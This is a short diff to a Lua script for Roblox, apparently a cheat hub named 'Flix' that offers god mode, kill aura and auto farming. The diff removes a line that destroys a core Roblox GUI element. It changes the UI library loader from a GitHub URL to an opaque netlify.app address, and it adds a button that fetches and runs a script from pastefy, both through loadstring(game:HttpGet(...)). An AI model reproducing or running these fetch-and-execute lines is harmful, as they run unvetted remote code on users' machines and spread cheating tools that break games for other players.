@@ -1,10 +1,8 @@
-game:GetService("CoreGui").RobloxGui["CoreScripts/NetworkPause"]:Destroy()
-
 local UIS = game:GetService("UserInputService")
 local LP = game:GetService("Players").LocalPlayer or game.Players.PlayerAdded:Wait()
 local Camera = workspace.CurrentCamera
 
-local Flix = loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperHackerYT/UI-Libs/refs/heads/main/Flix UI",true))()
+local Flix = loadstring(game:HttpGet("https://radiant-puffpuff-a4e0c1.netlify.app",true))()
 
 local window = b:CreateWindow({
     Title   = "Flix by Elvis",
@@ -1387,7 +1385,7 @@ scriptsTab:CreateButton({
     Title = "99 Nights In The Forest - Flix",
     Desc = "GOD Mode, Auto Day Farm, Kill Aura, etc",
     Callback = function()
-        https://pastefy.app/EFLiQVp7/raw
+        loadstring(game:HttpGet('https://pastefy.app/EFLiQVp7/raw'))()
     end
 })
 
